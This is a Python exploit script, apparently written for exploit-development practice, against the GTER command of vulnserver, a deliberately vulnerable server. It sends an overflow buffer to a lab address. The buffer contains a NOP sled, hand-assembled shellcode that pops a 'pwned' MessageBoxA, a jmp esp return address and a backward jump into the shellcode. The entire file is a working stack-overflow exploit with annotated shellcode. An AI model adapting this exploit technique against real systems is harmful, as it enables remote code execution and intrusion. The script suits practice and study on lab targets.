#!/usr/bin/python

import socket
import sys

host = "192.168.52.129"
port = 9999

#########################################
## WriTTen by:van6uard
## vulnserver GTER Exploit
## 
## Have limited space payload
# MessageBoxA 0x7E4507EA                                                           
#                                                                                  
# int WINAPI MessageBox(                                                           
#   __in_opt  HWND hWnd,                                                          
#   __in_opt  LPCTSTR lpText,                                                      
#   __in_opt  LPCTSTR lpCaption,                                                   
#   __in      UINT uType                                                           
# );                                                                               
#                                                                                  


MessageBoxA = ""
MessageBoxA += "\x33\xc0"                          # XOR EAX,EAX
MessageBoxA += "\x50"                              # PUSH EAX      => padding for lpCaption
MessageBoxA += "\x50"                              # PUSH EAX      => null heading
MessageBoxA += "\x8B\xCC"                          # MOV ECX,ESP   => PTR to lpCaption
MessageBoxA += "\x50"                              # PUSH EAX      => padding for lpText
MessageBoxA += "\x68\x70\x77\x6e\x64"              # PUSH "pwned"
MessageBoxA += "\x8B\xD4"                          # MOV EDX,ESP   => PTR to lpText
MessageBoxA += "\x50"                              # PUSH EAX - uType=0x0
MessageBoxA += "\x51"                              # PUSH ECX - lpCaption
MessageBoxA += "\x52"                              # PUSH EDX - lpText
MessageBoxA += "\x50"                              # PUSH EAX - hWnd=0x0
MessageBoxA += "\xBE\xEA\x07\x45\x7E"              # MOV ESI,USER32.MessageBoxA
MessageBoxA += "\xFF\xD6"                          # CALL ESI



buf = 'GTER ' 
buf += '\x90'*29
buf += MessageBoxA
buf += 'A'*(151-29-len(MessageBoxA))
buf += '\xaf\x11\x50\x62'           # jmp esp
buf += '\xeb\x80\x90\x90'           # negative jmp to shellcode
buf += 'D'*(300-147-4-4)


try:
    c = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #tcp socket
    c.connect((host, port))
    c.recv(1024)
    c.send(buf + '\r\n')
    print "[+] Evil shellcode sent..."
    c.close()



except:
    print "[-] Can't send evil buffer"
    sys.exit()

